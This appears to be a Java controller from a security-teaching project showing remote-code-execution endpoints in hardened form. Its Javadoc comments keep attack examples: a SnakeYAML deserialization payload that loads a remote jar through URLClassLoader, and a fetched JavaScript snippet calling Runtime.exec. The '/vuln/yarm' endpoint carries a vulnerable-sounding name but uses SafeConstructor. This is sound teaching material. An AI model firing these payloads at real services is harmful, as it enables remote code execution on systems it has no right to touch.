package org.joychou.controller;

import lombok.extern.slf4j.Slf4j;
import org.joychou.security.SafeCommand;
import org.joychou.security.SecurityUtil;
import org.joychou.util.ArithmeticEvaluator;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.util.HtmlUtils;
import org.yaml.snakeyaml.Yaml;
import org.yaml.snakeyaml.constructor.SafeConstructor;

import javax.script.Bindings;
import javax.script.ScriptContext;
import javax.script.ScriptEngine;
import javax.script.ScriptEngineManager;
import java.util.regex.Pattern;


/**
 * Java code execute
 *
 * @author JoyChou @ 2018-05-24
 */
@Slf4j
@RestController
@RequestMapping("/rce")
public class Rce {

    @GetMapping("/runtime/exec")
    public String CommandExec(String cmd) {
        // Allowlisted executable + allowlisted options + validated path; argv only, no shell.
        try {
            String output = SafeCommand.runCommand(cmd, false);
            if (output == null) {
                return "Bad boy. I got u.";
            }
            return HtmlUtils.htmlEscape(output);
        } catch (Exception e) {
            log.error("request failed", e);
            return "Request failed.";
        }
    }


    /**
     * <a href="http://localhost:8080/rce/ProcessBuilder?cmd=whoami">POC</a>
     */
    @GetMapping(value = "/ProcessBuilder", produces = "text/plain;charset=UTF-8")
    public String processBuilder(String cmd) {

        // Allowlisted executable + allowlisted options + validated path; no "/bin/sh -c".
        try {
            String output = SafeCommand.runCommand(cmd, false);
            if (output == null) {
                return "Bad boy. I got u.";
            }
            return HtmlUtils.htmlEscape(output);
        } catch (Exception e) {
            log.error("request failed", e);
            return "Request failed.";
        }
    }


    /**
     * http://localhost:8080/rce/jscmd?jsurl=http://xx.yy/zz.js
     *
     * curl http://xx.yy/zz.js
     * var a = mainOutput(); function mainOutput() { var x=java.lang.Runtime.getRuntime().exec("open -a Calculator");}
     *
     * @param jsurl js url
     */
    @GetMapping("/jscmd")
    public void jsEngine(String jsurl) throws Exception{
        // js nashorn javascript ecmascript
        // Only load scripts from allowlisted (trusted) domains; never splice user text into script source.
        String safeUrl = SecurityUtil.checkURL(jsurl);
        if (safeUrl == null) {
            throw new IllegalArgumentException("jsurl is not allowed");
        }
        ScriptEngine engine = new ScriptEngineManager().getEngineByName("js");
        Bindings bindings = engine.getBindings(ScriptContext.ENGINE_SCOPE);
        bindings.put("jsurl", safeUrl);
        engine.eval("load(jsurl)", bindings);
    }


    /**
     * http://localhost:8080/rce/vuln/yarm?content=!!javax.script.ScriptEngineManager%20[!!java.net.URLClassLoader%20[[!!java.net.URL%20[%22http://test.joychou.org:8086/yaml-payload.jar%22]]]]
     * yaml-payload.jar: https://github.com/artsploit/yaml-payload
     *
     * @param content payloads
     */
    @GetMapping("/vuln/yarm")
    public void yarm(String content) {
        // SafeConstructor only builds standard YAML types; arbitrary class tags are rejected.
        Yaml y = new Yaml(new SafeConstructor());
        y.load(content);
    }

    @GetMapping("/sec/yarm")
    public void secYarm(String content) {
        Yaml y = new Yaml(new SafeConstructor());
        y.load(content);
    }

    /**
     * http://localhost:8080/rce/groovy?content=1%2B2*3
     *
     * Request data is never compiled or evaluated as Groovy source. Only plain arithmetic
     * (numbers, + - * / and parentheses) is accepted and evaluated by a small parser.
     *
     * @param content arithmetic expression
     */
    @GetMapping(value = "groovy", produces = "text/plain;charset=UTF-8")
    public String groovyshell(String content) {
        if (content == null || !ARITHMETIC.matcher(content).matches()) {
            return "Bad boy. I got u.";
        }
        try {
            // The echoed value is the evaluator's result (a number or true/false), HTML-escaped.
            return HtmlUtils.htmlEscape(ArithmeticEvaluator.evaluate(content));
        } catch (RuntimeException e) {
            return "Bad expression";
        }
    }

    private static final Pattern ARITHMETIC = Pattern.compile("^[0-9+\\-*/%().<>=!\\s]{1,128}$");



    public static void main(String[] args) throws Exception{
        Runtime.getRuntime().exec("touch /tmp/x");
    }
}

